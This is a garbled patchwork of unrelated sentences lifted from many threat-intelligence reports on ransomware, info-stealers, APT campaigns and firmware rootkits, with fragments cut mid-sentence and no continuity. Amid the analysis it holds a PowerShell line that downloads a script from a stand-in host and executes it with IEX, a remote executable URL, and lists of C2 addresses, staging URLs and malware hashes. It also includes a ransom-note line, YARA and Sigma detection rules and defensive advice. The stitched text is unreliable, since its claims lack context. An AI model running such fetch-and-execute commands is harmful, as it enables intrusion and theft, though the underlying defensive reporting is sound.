It steals the existing cookie of the logged-in account from the browser and crafts requests that modify the settings. 
Its PowerShell script can elude detection in a .NET loader or PyArmor.
User Execution: Malicious Link T1204.001 TrickBot has sent spearphishing emails in an attempt to lure users to click on a malicious link. 
Finally, a subset of the IP addresses belongs to Powerhouse Management, a VPN service provider.
IFantasy wiper. 
Figure 4 – Credential extraction tool embedded inside malicious executable Detection can also be avoided by using several “living off the land’ mechanisms, available in many post-exploitation frameworks, to execute the credential harvesting tools directly from memory using Reflective PE injection, where the binary is never written to the disk.
It provides Single-Sign-On functionality for accessing multiple shared resources within the enterprise network.
The output is then parsed to the targeted process ID with the help of tasklist filters.
WhisperKill creators prioritized speed and number of affected files over ensuring the full drive is overwritten, since only 1 MB of each file was overwritten.
The fact that the compromised file is digitally signed suggests the attackers were able to access the company’s software development or distribution pipeline.
Otherwise, the entire system, except for certain critical directories, is encrypted. 
The cache_init file highlighted in Figure 2 is the GoBruteforcer malware we found hosted in the /.x/ directory of the targeted server.
It additionally sets the SUID and SGID bits of the /private/etc/logind file. 
The response is parsed, and the new stealer is downloaded and executed.
Once completed, it will then call kernel32.VirtualALloc to prepare injecting a PE executable for the next stage.
This may lead to irreversible damage to your data and you may not be able to turn your computer back on. 
Prior to implementing any temporary solution, ensure appropriate backups have been completed. 
Account Manipulation Adds newly created accounts to the administrators group to maintain elevated access. T1547.001.
title: Qakbot Returns to ISO Delivery (For Now) url: https://www.esentire.com/blog/qakbot-returns-to-iso-delivery-for-now Adversaries don’t work 9-5 and neither do we.
This allows the threat actor to inject a malicious copy of a web page (typically a login or checkout page one is visiting) so that every time that page is visited, it is the compromised version.
Enable continuous access evaluation Continuous access evaluation (CAE) revokes access in real time when changes in user conditions trigger risks, such as when a user is terminated or moves to an untrusted location. 
Cisco Secure Firewall and Meraki MX can detect malicious activity associated with this threat.
We have seen NetWalker activity before March but there has been a noticeable uptick in larger victims since their advertisement.
Unit 42 researchers have observed Trigona’s threat operator engaging in behavior such as obtaining initial access to a target’s environment, conducting reconnaissance, transferring malware via remote monitoring and management (RMM) software, creating new user accounts and deploying ransomware. 
(see Figure 3).
The actors executed PowerShell on the AD to obtain a list of machines on the domain. 
Figure 2: Sample email using thread hijacking to deliver an HTML attachment. 
S0169 RawPOS
All that is left is to execute the backdoor.
For instance, the following enables the account logon events to be audited: Decoy machines must be setup to run the log collector agent that can collect the access logs generated and forward them to the correlation server.
Archive Collected Data Impact T1486: Data Encrypted for Impact T1531: Account Access Removal Command and Control T1071.001:
[DS0009]. Detection:
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty -json -filter locker_Apple_M1_64 ... { "event" : "ES_EVENT_TYPE_NOTIFY_OPEN", "file" : { "destination" : "/private/tmp/locklog", "process" : { ... "pid" : 8231 "name" : "locker_Apple_M1_64", "path" : "/Users/user/Downloads/locker_Apple_M1_64", ... } } } Then, accessing (opening) the files in the specified directory, to encrypt them, and renaming the encrypted files with the .lockbit extension: # FileMonitor.app/Contents/MacOS/FileMonitor -pretty -json -filter locker_Apple_M1_64 ... { "event" : "ES_EVENT_TYPE_NOTIFY_OPEN", "file" : { "destination" : "/Users/user/Downloads/lock_me_up/DazzleSpy.zip", "process" : { ... "pid" : 8231 "name" : "locker_Apple_M1_64", "path" : "/Users/user/Downloads/locker_Apple_M1_64", ... } } }, { "event" : "ES_EVENT_TYPE_NOTIFY_RENAME", "file" : { "destination" : "/Users/user/Downloads/lock_me_up/DazzleSpy.zip.lockbit", "process" : { ... "pid" : 8231 "name" : "locker_Apple_M1_64", "path" : "/Users/user/Downloads/locker_Apple_M1_64", ... } } } Finally, it creates a file named "!!!
Figure 3: The decompiled code extracted from the full.pyc compiled byte code file showing the content of the get_path() method. 
T1573.001Encrypted Channel:
The ransomware is highly customizable and contains technically unique features, such as the use of direct syscalls, rarely observed in ransomware.
server_config section of a decoded FlowCloud configuration FlowCloud’s capabilities are spread out over a series of singleton classes, each of which implements a cohesive set of functionalities related to a specific type of data or action.
Creating a new file under the C drive which will be filled with random data until it takes the maximum space it can from the partition, overwriting the already overwritten existing files.
However, for the sake of transparency, we decided to include our research efforts. 
Event name in PUBLOAD Figure 12.
<= 14} 20 Apr 2023 - 11:30AM 
This function also enables RedLine to steal credentials for additional installed applications. 
The majority of the payloads for these droppers are njRAT, but we have also seen AsyncRAT.
A snippet of the AutoIt code _
S0049 GeminiDuke
The backdoor initiates requests to the C2 server and the C2 server may include commands to execute in the responses.
Other targeted sectors include healthcare and nongovernmental organizations (NGOs). 
Figure 1.
The attached PDF is named “W-8BEN Form.PDF” and impersonates a legitimate IRS form.
One does not use any obfuscation and just contains the simple command to stop Cisco AMP Orbital.
According to Shodan, the IP address 193[.]135[.]134[.]124 hosted by a Russian provider may be the real C2 IP address protected by the Cloudflare infrastructure as the SSL certificate served on port 8443 belongs to Cloudflare and lists the X509v3 Subject Alternative Name as DNS:*.softlemon.net. 
kernel32_WriteFile 0x1CE43DE : kernel32_CloseHandle 0x548C5A4 : Rpcrt4_RpcStringBindingComposeW 0x7B0F79F : Rpcrt4_RpcBindingFromStringBindingW 0x69A2B62 :
NewValue == "True" | project ConsentTimestamp =Timestamp, UserId, AccountObjectId, ReportId, ActionType | join kind = leftouter (CloudAppEvents | where Application == "Office 365" | where ActionType == "Add app role assignment to service principal." 
While several top-tier RaaS affiliate programs, such as Babuk, DarkSide and REvil (aka Sodinokibi) disappeared from the underground in 2021, LockBit 2.0 continued to operate and gradually became one of the most active ransomware operations.
MoonBounce’ indicators of compromise EFI Rootkit – Malicious CORE_DXE D94962550B90DDB3F80F62BD96BD9858 Modified WMI DLL Launcher C3B153347AED27435A18E789D8B67E0A StealthVector 4D5EB9F6F501B4F6EDF981A3C6C4D6FA E7155C355C90DC113476DDCF765B187D 899608DE6B59C63B4AE219C3C13502F5 4EF90CEEF2CC9FF3121B34A9891BB28D CFF2772C44F6F86661AB0A4FFBF86833 InstallUtil Launcher 5F9020983A61446A77AF1976247C443D StealthMutant 0603C8AAECBDC523CBD3495E93AFB20C 8C7598061D1E8741B8389A80BFD8B8F5 F9F9D6FB3CB94B1CDF9E437141B59E16 Microcin 5FE6CE9C48D0AE98EC2CA1EC9759AAD9 50FF717A8E3106DDBF00FB42212879C5 D98614600775781673B6DF397CC4F476 Go Implant C9B250099E2DD27BB4170836AC480FE0 97EF7B8FCDCB0C0D9FBB93D0F7E6E3B6 Mimikat_SSP 4E4388D7967E0433D400C60475974D50 5F1C7602688E67F299F5BD533FA07880 xTalker Rootkit 45E862964EF4EFDEA181F3927D20E96D 4BC82105403974AA24BF02CFB66B8F7C Domains and IPs mb.glbaitech[.]com – MoonBounce ns.glbaitech[.]com – ScrambleCross dev.kinopoisksu[.]com – ScrambleCross st.kinopoisksu[.]com – ScrambleCross 188.166.61[.]146 – ScrambleCross 172.107.231[.]236 – ScrambleCross 193.29.57[.]161 – ScrambleCross 136.244.100[.]127 – ScrambleCross 217.69.10[.]104 – ScrambleCross 92.38.178[.]246 – ScrambleCross m.necemarket[.]com – Microcin 172.105.94[.]67 – Microcin holdmem.dbhubspi[.]com – Microcin 5.188.93[.]132 – Go malware 5.189.222[.]33 – Go malware 5.183.103[.]122 – Go malware 5.188.108[.]228 – Go malware 45.128.132[.]6 – Go malware 92.223.105[.]246 – Go malware 5.183.101[.]21 – Go malware 5.183.101[.]114 – Go malware 45.128.135[.]15 – Go malware 5.188.108[.]22 – Go malware 70.34.201[.]16 – Go malware File Names wbwkem.dll – StealthVector wkbem.dll – StealthVector wmiwk.dll – StealthVector C_20344.nls – StealthVector C_20334.nls – StealthVector compwm.bin – ScrambleCross Shellcode pcomnl.bin – ScrambleCross Shellcode wmipl.dll – ScrambleCross encrypted shellcode Microsoft.Service.Watch.targets – StealthMutant MstUtil.exe.config –
Activity related to this campaign will trigger the following alert: OAuth app with suspicious metadata has Exchange permission​. This alert is generated when a line of business OAuth app with suspicious metadata has privilege to manage permission over Exchange, which can lead an OAuth App to perform data collection or exfiltration activities or attempts to access and retrieve sensitive information. 
In the hands of a malicious actor, this tool can be used as a persistence mechanism and remote accessing. 
Since reverse engineering can be time intensive, you’ll want to only use manual methods for tasks like unpacking after you’ve exhausted your other tools and options. 
Net.WebClient).DownloadString('https://example.com/ReflectivePEInjection.ps1') | IEX $remoteUrl = "https://transfersh.com/XXXXXXX/whatever.exe" $webClient = New-Object System.
New users can try Cisco Secure Endpoint for free here.
FGLTB!tr.bdr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR.
To keep the operators behind ModPipe at bay, potential victims in the hospitality sector as well as any other businesses using the RES 3700 POS are advised to: Use the latest version of the software. 
But detailed analysis pointed to the Winnti group (also known as APT41, per FireEye) of Chinese origin.
S0648 JSS Loader
Two months previously, Toll Group was a victim of a Netwalker ransomware attack.
Operation DreamJob with a Linux payload The Lazarus group’s Operation DreamJob involves approaching targets through LinkedIn and tempting them with job offers from industry leaders.
See CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections. 
Who is Vice Society?Vice Society is a relatively new player in the ransomware space.
It can: Check for VMware and VirtualBox Delete the dropper executable Run the dropper continuously Download and execute files Terminate if a “Program Manager” window is found Read a binary from its resource section, write it to disk and execute it Modify the security descriptor (ACL) for the injected process For more information see this analysis by Morphisec where similar AutoIt droppers were used with Frenchy shellcode. 
In this sense, the group has introduced its own innovation to this landscape – patching an existing benign core component in the firmware (rather than adding a new driver to it), thereby turning the UEFI firmware into a highly stealthy and persistent storage for malware in the system. 
Researchers at ASERT have observed a new campaign targeting institutions in Romania and Russia utilizing spear phishing emails pretending to be from financial vendors or partners to trick users into opening the malicious attachments in the emails.
Crimson RAT variants implement different obfuscation techniques of varying intensities, for example, simple function name malformation and dynamic string resolution.
With this publication, NCC Group and Fox-IT aim to provide the wider community with information and intelligence that can be used to hunt for this threat in historic data and improve detections for intrusions by this intrusion set. 
It can also update the local configuration when the corresponding command is received. 
There is not much data for the Edge browser, so when we add the cookie information collected for Mozilla, we can see clearly in the following image that it has collected cookie information for many account details. 
The result of the speed tests: RansomwareAverage approximate time of encryptionLockBit v.37 minutesRorschach4 minutes, 30 secondsIt turned out that we have a new speed demon in town.
–> Initially, this byte is set to 0, which denotes that the MFT has not been encrypted.
The tool appeared to be still under development as several command options were not yet implemented. 
In addition, we are also concerned that there may be many other organizations that have been exploited but have not been discovered.
Additional Resources LockBit 3.0: Another Upgrade to the World’s Most Active RansomwareRansomware Groups to Watch: Emerging ThreatsAverage Ransom Payment Up 71% This Year, Approaches $1 Million2022 Unit 42 Ransomware Threat Report Highlights Get updates from Palo Alto Networks! 
Actions to take today to harden your local environment: Establish a security baseline of normal network activity; tune network and host-based appliances to detect anomalous behavior. 
After assessing risks, if you deem RDP operationally necessary, restrict the originating sources and require MFA to mitigate credential theft and reuse. 
Token Impersonation/TheftAttackers were seen using partially modified PrintSpoofer tool to drop and subsequently execute loader with SYSTEM privileges. 
[D3-UGLPA] Server Software Component [T1505]: Web Shell [T1505.003] Chinese state-sponsored cyber actors have been observed planting web shells on exploited servers and using them to provide the cyber actors with access to the victim networks. 
Exfiltration Based on our telemetry, we found that Earth Preta used multiple approaches to exfiltrate sensitive data from the victims.
This is then followed by the following process flow: Once downloaded and installed, the threat actor initiated a connection to the AnyDesk host. 
Ngrok is known to be used for malicious purposes.[1] The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account
Anti-Ransomware Module to detect LockBit 2.0 encryption behaviors on Windows. 
1. Offset 0x0: Magic (8 bytes) 2. Offset 0x8: Encrypted flag (0 = not encrypted, 3 = RC4 encryption) 
We analyzed vulnerabilities, attack vectors, and indicators of compromise (IOCs), identified the most prevalent ransomware gangs targeting LATAM governments, and highlighted the lack of proper cybersecurity hygiene in the region.
When the victim machine starts up, the infected MBR copies the initial loader code from the last megabyte of the hard drive to the highest available memory located before the EBDA1.
Ingress Tool Transfer Downloads and uploads files to and from the victim’s machine. 
<hostname>Account
On a separate note, we observed the use of the Winnti malware.
As stealthy as POSHSPY can be, it comes to light quickly if you know where to look.
The goal of targeting some victims appears to be to obtain data.
Table 1.
TA581 typically delivers IcedID, but has been observed using Bumblebee malware and telephone-oriented attack delivery (TOAD) payloads.
title: Dead or Alive?
It is also interesting to note that Lazarus can produce and use malware for all major desktop operating systems: Windows, macOS, and Linux.
filename> > /dev/null 2>&1 && cd – > /dev/null 2>&1″ command, thus launching the Trojan Loader. 
But most importantly: The largest overlap is in the top half of the pyramid of pain: domain names, host artifacts, tools, and TTPs.
[T1543.003] on the Operating System with the acquired System rights by using the *Potato tools.
Initial Version March 24, 2021:
As this rule may loop on file content, preferably use on regtrans-ms files only or with caution." 
Earth Preta’s top 10 targeted industries We used a qualitative approach to identify the collection requirements, methods, and objectives of the operational groups and their respective places in the organization.
"C:\Windows\syswow64\cmd.exe" /C pause dll mail, , A sigma rule for this cmdline can be found in the Detections section of this report. 
As we’ll set this makes analysis even easier! 
The XMRig implant will execute until the user logs off, shuts down their computer or opens Activity Monitor.
At the current publication of the article, a patch has not been developed or released. 
Because of the common use of this port, and the use of TLS in these connections, both attempts and the successful connections went undetected by Suricata and Cisco AMP. 
/TARGET=\\HOST2.DOMAIN.NAME\C$ /TARGET=\\HOST3.DOMAIN.NAME\C$ /login
According to Threat Intelligence and Research, the initial access is performed either through vulnerability exploitation or spear phishing attachments.
Determining whether hosts are running affected versions SELECT MIN(ingestion_timestamp) AS first_seen, MAX(ingestion_timestamp) AS last_seen, meta_hostname, ARRAY_JOIN(ARRAY_AGG(DISTINCT(meta_hostname)), ', ')
Segment externally facing servers and services from the rest of the network with a demilitarized zone (DMZ). 
The script in question has the SHA1 a9da0947243333d95f84f6a0e37b9fc29b2fb054. 8220 Infection Script Snippet We can see it is quite simple in design and built around the process of downloading and setting persistence of some other file. 
+65.6983.8730 Japan: +81.50.1790.0200 Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members.
Kodex ransomware's note Conclusion EvilExtractor is being used as a comprehensive info stealer with multiple malicious features, including ransomware.
Figure 5: Comparison of code in document vs. blog Once the payload is decoded, it is written to the hardcoded path “C:\Users\user\AppData\Local\Microsoft\Office\OfficeTelemetry.dll” and executed using ShellExecute with the following command line: 
Victimology Based on our long-term investigation, Southeast Asia is Earth Zhulong’s major target, focusing on telecom and media sectors.
FGLTA!tr.bdr W64/Havoc.
It would also reduce the speed and frequency of opportunistic attacks by forcing threat actors to dedicate time and funding to research unknown vulnerabilities and develop custom exploitation tools. 
We will continue analyzing the deployed implants to find out more details about the toolset used in the supply chain attack. 
During the bat execution, the script extracts two separate binaries from the base64 encoded text, AES decrypts, and GZIP decompresses it to produce two separate byte arrays.
Indicators of Compromise SHA1 4585da0ff7a763be1a46d78134624f7cd13e6940 14be1c43fbfb325858cda78a126528f82cf77ad2 dc98b516c9c589c2b40bc754732ad5f16deb7c82 d034880d1233d579854e17b6ffad67a18fb33923 858f3f7f656397fcf43ac5ea13d6d4cbe7a5ca11 9a080cd497b8aa0006dc953bd9891155210c609c 8c64e820a4c5075c47c4fbaea4022dc05b3fd10b 3326708ba36393b1b4812aa8c88a03d72689ac24 cf5ab37612f24ed422a85e3745b681945c96190e cf21028b54c4d60d4e775bf05efa85656de43b68 Onions tzw7ckhurmxgcpajx6gy57dkrysl2sigfrt6nk4a3rvedfldigtor7ad[.]onion obzuqvr5424kkc4unbq2p2i67ny3zngce3tbdr37nicjqesgqcgomfqd[.]onion MITRE ATT&CK T1005 – Data from Local System T1202 – Indirect Command Execution T1486 – Data Encrypted for Impact T1070.004 – Indicator Removal:
Comparison of the original symbol names from two Linux backdoors submitted to VirusTotal guiconfigd (SimplexTea for Linux, from Georgia)sysnetd (BADCALL for Linux, from Romania) CMsgCmd::Start(void)MSG_Cmd CMsgSecureDel::Start(void)MSG_Del CMsgDir::Start(void)MSG_Dir CMsgDown::Start(void)MSG_Down CMsgExit::Start(void)MSG_Exit CMsgReadConfig::Start(void)MSG_ReadConfig CMsgRun::Start(void)MSG_Run CMsgSetPath::Start(void)MSG_SetPath CMsgSleep::Start(void)MSG_Sleep CMsgTest::Start(void)MSG_Test CMsgUp::Start(void)MSG_Up CMsgWriteConfig::Start(void)MSG_WriteConfig MSG_GetComInfo CMsgHibernate::Start(void) CMsgKeepCon::Start(void) CMsgZipDown::Start(void) 
We refer to this sample as mim220. 
Windows Shortcut (LNK) “Weaponize” is a term that refers to the first phase of the kill chain and it is categorized as the Build Capabilities technique under Resource Development tactic of the MITRE ATT&CK framework. 
The idea of deception originates from the decades old honeypot systems but, unlike those, relies more on forging trust and giving adversaries what they are looking for.
To confirm that our software works email to us 2 files from random computers you will get them decrypted. 
First HTTP connection with C2After the correct response headers are received, the malware establishes a second connection to the same port, where a POST request is made.
New WatchDog Malware There are two samples that show the evolution of WatchDog techniques to mimic TeamTNT operations, 36ca9f84864ad022c255b7d91e75997f035716e4df5dc1c90ee2651f092f5d79 and 49366ae4766492d94136ca1f715a37554aa6243686c66bf3c6fbb9da9cb2793d.
On March 31, 3CX noted that Google has invalidated the company’s previous signing certificate, which means both the originally infected MSI files plus files issued by 3CX earlier in the week using that certificate will be blocked, and issued a fresh one.
author: TheDFIRReport references: - https://thedfirreport.com/ date: 2022/10/03 logsource: category: process_creation product: windows detection: 
For a list of default pipe names for other services including some custom profiles check out @svch0st’s post here. 
Which Tools and Vulnerabilities MuddyWater Use? PowGoop DLL Loader: PowGoop malware is a malicious DLL loader.
Unit42 (PaloAlto) provides a good article on trends and observations of PowerShell encoded commands: Decoding this again using CyberChef shows the resulting PowerShell script: Lots of custom scripts dropped by threat actors Other tools and scripts were dropped onto one endpoint: 
So long as the results of check_timestamp are less than v6 (the timestamp value from manifest), the loop continues to sleep.
The credential theft module is dropped if the malware has one of the following privileges: (It should be noted that the PROC_FLAG can any of the possible values) SeDebugPrivilege SeShutdownPrivilege & SeDebugPrivilege SeDebugPrivilege & SeTcbPrivilege SeShutdownPrivilege & SeDebugPrivilege & SeTcbPrivilege The MBR overwrite and MFT encryption subroutine is not executed if avp.exe is found running on the system The EternalBlue subroutine is not executed if either ns.exe or ccSvcHst.exe are found running on the system The system is rebooted using the API NtRaiseHardError if the process has at least the SeShutdownPrivilege level Credential Theft Credentials are provided to the malware in two ways: 
One of the techniques is to use the Volume Shadow Copy Service using the vssadmin command line utility and then extract the Ntds.dit file from the volume shadow copy as shown below. 
The Cybersecurity and Infrastructure Security Agency-Multi-State Information Sharing & Analysis Center Joint Ransomware Guide covers additional best practices and ways to prevent, protect, and respond to a ransomware attack. 
Screenshot of decoy document Figure 2.
Mitigations FBI, CISA, and HHS recommend organizations, particularly in the HPH sector, implement the following to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Hive ransomware: 
S0567 Dtrack
Schedule ➝ rundll32.exe
Pass the HashTechniqueT1550.002https://attack.mitre.org/techniques/T1550/002/CollectionTacticTA0009https://attack.mitre.org/tactics/TA0009/Archive Collected Data: Archive via UtilityTechniqueT1560.001https://attack.mitre.org/techniques/T1560/001/Automated CollectionTechniqueT1119https://attack.mitre.org/techniques/T1119/Data from Information Repositories: SharePointTechniqueT1213.002https://attack.mitre.org/techniques/T1213/002/Data from Local SystemTechniqueT1005https://attack.mitre.org/techniques/T1005/Data from Network Shared DriveTechniqueT1039https://attack.mitre.org/techniques/T1039/Data Staged: Local Data StagingTechniqueT1074.001https://attack.mitre.org/techniques/T1074/001/Data Staged:
They allow us to detect specific events or actions with an extensive range of options to create decoy assets, each designed to provide valuable intelligence and real-time notifications: from email alerts to webhook integrations and many other features for monitoring and security needs. 
The delay in reaching out to victim organizations with a ransom demand could be due to various factors, such as extending the amount of time that the zero day vulnerability remained undetected and/or capacity to negotiate with a large number of victims simultaneously.
The same application was later used to deploy the rest of the attack. 
title: Rorschach – A New Sophisticated and Fast Ransomware - Check Point Research url: https://research.checkpoint.com/2023/rorschach-a-new-sophisticated-and-fast-ransomware/ Research by: Jiri Vinopal, Dennis Yarizadeh and Gil Gekker Key Findings: Check Point Research (CPR) and Check Point Incident Response Team (CPIRT) encountered a previously unnamed ransomware strain, we dubbed Rorschach, deployed against a US-based company. 
[T1133] Spearphishing emails with malicious attachments [T1566.001] and links [T1566.002] Drive-by compromises
Executive Summary This technical analysis provides an in-depth analysis and review of NotPetya. 
How Zerobot gains and maintains device access IoT devices are often internet-exposed, leaving unpatched and improperly secured devices vulnerable to exploitation by threat actors.
BADCALL for Linux We attribute sysnetd to Lazarus because of its similarities with the following two files (and we believe that sysnetd is a Linux variant of the group’s backdoor for Windows called BADCALL): 
Cracks and other illegally owned software will only work for certain periods since majority of license verification methods are now done in the cloud.
%%
If all the conditions are met, the script retrieves the following files: d2ef5.exe.gpg (encrypted Ursnif)p9d2s.exe.gpg (encrypted Vidar Stealer)d655.dll.gpg (encrypted Cobalt Strike)f827.exe.gpg (encrypted Syncro RMM)shutdowni.bat We were unable to retrieve the shutdowni.bat file but we believe the script might have been deployed to restart the host. 
The final type of payload that we will mention is AsyncRAT.
The source of the infection starts with a set of hooks that intercept the execution of several functions in the EFI Boot Services Table, namely AllocatePool, CreateEventEx and ExitBootServices.
First, organizations should implement robust endpoint security solutions to detect and block suspicious behavior and unauthorized execution of LOLBaS. Additionally, organizations should enforce the principle of least privilege, such as zero trust, confirming that users have only the permissions necessary to perform their tasks, thus limiting potential impact of LOLBaS execution.
GetDiskFreeSpaceEx() function to retrieve the disk size in bytes.
T1005
Implement time-based access for accounts set at the admin level and higher.
06.13.2022.lnk.lnk" author = "The DFIR Report" reference = "https://thedfirreport.com" date = "2022-11-28" hash1 = "1bf9314ae67ab791932c43e6c64103b1b572a88035447dae781bffd21a1187ad" strings: $x1 = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword ascii $s2 = "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide $s3 = "<..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide $s4 = "-c \"&{'p8ArwZsj8ZO+Zy/dHPeI+siGhbaxtEhzwmd3zVObm9uG2CGKqz5m4AdzKWWzPmKrjJieG4O9';$BxQ='uYnIvc3RhdHMvUkppMnJRSTRRWHJXQ2ZnZG1pLyI" wide $s5 = "WindowsPowerShell" fullword wide $s6 = "black-dog" fullword ascii $s7 = "powershell.exe" fullword wide /*
This executable uses the Windows Native API to write the contents of an embedded executable to the file system at the following location: 
In older versions, this account might be assigned with the Global Administrator role. 
test.vbs creates %usertemp%\Note.txt, a clean file containing fake "QUARTERLY TAX PAYMENTS FOR 2022" data. Figure 4.
The other domain “tourdeworldsport”, also started resolving to the IP “5[.]61[.]34[.]46” on 18 Nov 2022. 
As with any observed nation-state actor activity, Microsoft has directly notified targeted or compromised customers, providing them with important information needed to secure their environments. 
He explains in simple terms how it works.
G0016 APT29
We can look for these system calls in the list of imported functions.
All the collected information is then put together into a query string which is generated based on the computer architecture. 
The data stored in the BSS section is encoded as shown in Figure 19. Figure 19: Snipped of the encoded data in the BSS section 
Figure 30.
Mitigations NSA, CISA, and FBI urge federal and SLTT government, CI, DIB, and private industry organizations to apply the following recommendations as well as the detection and mitigation recommendations in Appendix A, which are tailored to observed tactics and techniques: Patch systems and equipment promptly and diligently.
LockBit’s ransomware that targets Windows/Linux, and also VMware ESXi. 
File name: Dll.dll SHA256: 074eb0e75bb2d8f59f1fd571a8c5b76f9c899834893da6f7591b68531f2b5d82 45c8233236a69a081ee390d4faa253177180b2bd45d8ed08369e07429ffbe0a9 9ceca98c2b24ee30d64184d9d2470f6f2509ed914dafb87604123057a14c57c0 29b75f0db3006440651c6342dc3c0672210cfb339141c75e12f6c84d990931c3 c8c907a67955bcdf07dd11d35f2a23498fb5ffe5c6b5d7f36870cf07da47bff2 File name: 180000000.dll (Dump từ tiến trình Svchost.exe) SHA256: 76a2f2644cb372f540e179ca2baa110b71de3370bb560aca65dcddbd7da3701e IP: 125[.]212[.]220[.]48 5[.]180[.]61[.]17 47[.]242[.]39[.]92 61[.]244[.]94[.]85 86[.]48[.]6[.]69 86[.]48[.]12[.]64 94[.]140[.]8[.]48 94[.]140[.]8[.]113 103[.]9[.]76[.]208 103[.]9[.]76[.]211 104[.]244[.]79[.]6 112[.]118[.]48[.]186 122[.]155[.]174[.]188 125[.]212[.]241[.]134 185[.]220[.]101[.]182 194[.]150[.]167[.]88 212[.]119[.]34[.]11 URL: hxxp://206[.]188[.]196[.]77:8080/themes.aspx C2: 137[.]184[.]67[.]33 Mitre ATT&CK Mapping Tatic ID Name Resource Development T1586.002 Compromise Accounts: Email Accounts Execution T1059.003 Command and Scripting Interpreter:
ViperSoftX
Figure 6 – directory names and file extensions excluded by NoEscape ransomware Encryption To encrypt files in the victim’s system, the ransomware utilizes the “Microsoft Enhanced RSA and AES Cryptographic Provider” libraries.
Backdoor f1817665ea2831f775e23cbda27cbeb06d03e6c39bbfad920b50f40712dd37cb SHA256 Hash NewWorldOrder Loader / Carbanak Backdoor 51e0512a54640be8e3477363c8d72d893c6edd20399bddf71e95eec3ddfdb42e SHA256 Hash NewWorldOrder Loader / Carbanak Backdoor f4ebd59fb578a0184abf6870fc652210d63e078a35dace0a48c5f273e417c13d SHA256 Hash NewWorldOrder Loader / Domino Backdoor 92651f9418625e5281b84cccb817e94e6294b36c949b00fcd4046770b87f10e4 SHA256 Hash NewWorldOrder Loader / Domino Backdoor e5af0b9f4650dc0193c9884507e6202b04bb87ac5ed261be3f4ecfa3b6911af8 SHA256 Hash Domino Backdoor hxxp://170.130.55[.]250/x64.exe URL Staging URL for Domino Backdoor hxxps://upperdunk[.]com/mr64.exe URL Staging URL for Domino Backdoor 88.119.175[.]124 IP Address Domino Backdoor C2 94.158.247[.]72 IP Address Domino Backdoor C2 178.23.190[.]73 IP Address Carbanak C2 es-megadom[.]com Domain Project Nemesis C2 185.225.17[.]202 IP Address Domino Backdoor C2 5.182.37[.]118 IP Address Domino Backdoor C2 45.67.34[.]236 IP Address Project Nemesis C2 Scroll to view full table To learn how IBM X-Force can help you with anything regarding cybersecurity including incident response, threat intelligence, or offensive security services schedule a meeting here: IBM X-Force Scheduler If you are experiencing cybersecurity issues or an incident, contact X-Force to help: US hotline 1-888-241-9812 Global hotline (+001) 312-212-8034. 
It doesn’t prevent the plugin from working since it only tries to load it if the file actually exists.
This is a subset of our current Courses of Action initiative and will be updated as the project progresses. 
Gathering Intelligence on NetWalker As always, building adaptable defensive architecture starts with intelligence.
This results in a crucial portion of the code being virtualized in addition to lacking an IAT table.
Former members of the Trickbot/Conti syndicate which X-Force tracks as ITG23 have been using Domino since at least late February 2023 to deliver either the Project Nemesis information stealer or more capable backdoors such as Cobalt Strike. 
Spearphishing Attachment (T1193) Cryptojackers Exploit Critical Apache Struts Flaw (August 30, 2018) Security experts from Volexity have recently seen a critical Apache Strut vulnerability being exploited in the wild to install a popular cryptocurrency miner on targeted machines.
In this campaign, the suspected Russian threat actors, use several highly obfuscated and underdevelopment custom loaders in order to infect those involved in the cryptocurrency industry with Enigma stealer (detected as TrojanSpy.MSIL.ENGIMASTEALER.YXDBC), which is a modified version of the Stealerium information stealer.
$exec = New-Object -ComObject shell.application This line creates a new Shell.
Tune your security program, including people, processes, and technologies, based on the data generated by this process. 
FOCUSFJORD C2 IP 141.164.52.232 
There were also artifacts in the environment that indicate that the recently disclosed PrintNightmare vulnerability may have been used during this attack.
For similar articles and news delivered straight to your inbox, subscribe to the BlackBerry Blog. 
ELGATendyron malicious DLL. 
By disabling this user right, you can prevent non-administrative users from creating services.• Restrict access to the Security Accounts Manager (SAM) file: The SAM file contains sensitive information, including user account passwords.
This function is responsible for adjusting the resource limits of the running process.
When they returned, several more Cobalt Strike beacons were launched and several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable and a PowerShell implementation.
Despite its relatively simple goals, the library’s code makes heavy use of anti-debugging tricks and control flow obfuscation to hinder analysis.
However, Phase 1 ended before they were able to implement this plan. 
CISA assessed that this traffic indicated a confirmed compromise based on the successful callback to the indicator and informed the organization of these findings; the organization investigated the activity and found signs of compromise.
There is also an article by Lab52 describing one of the NSIS installers used in Operation Spalax, which they attribute to APT-C-36. 
Enable the Domain Name System Security Extensions (DNSSEC) on the domain.
Every recording file stored in the working directory has the following name format: <plugin prefix><recording type prefix><five-digit random number>.<extension> The plugin prefix, the extension and the recording type prefix depend on the ID of the plugin that created the recording.
In one instance, Microsoft also observed the subgroup using TTPs from both attack chains in a single compromised environment.
G0011 PittyTiger
Could be whatever you want / define in the java programm. 
If the connection fails, It will break and throw an exception.
Next, the .NET injector gets loaded into the IronPython process with the help of the Assembly.
We’ll go into this in more detail in the HTTP C2 Communication section. 
Microsoft removes the infected messages from Exchange Online mailboxes using zero-hour auto purge (ZAP) if this event occurs. 
4becc0d518a97cc31427cd08348958cda4e00487c7ec0ac38fdcd53bbe36b5cc Webinjects: ef6603a7ef46177ecba194148f72d396d0ddae47e3d6e86cf43085e34b3a64d4 Emotet: dd20506b3c65472d58ccc0a018cb67c65fab6718023fd4b16e148e64e69e5740 Kronos: aad98f57ce0d2d2bb1494d82157d07e1f80fb6ee02dd5f95cd6a1a2dc40141bc Zeus: 0f409bc42d5cd8d28abf6d950066e991bf9f4c7bd0e234d6af9754af7ad52aa6 IcedID: 358af26358a436a38d75ac5de22ae07c4d59a8d50241f4fff02c489aa69e462f Dridex: ffbd79ba40502a1373b8991909739a60a95e745829d2e15c4d312176bbfb5b3e Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from us 
It downloads a new Lazarus malicious payload for Linux and we explain its relationship to the attack later in the text. 
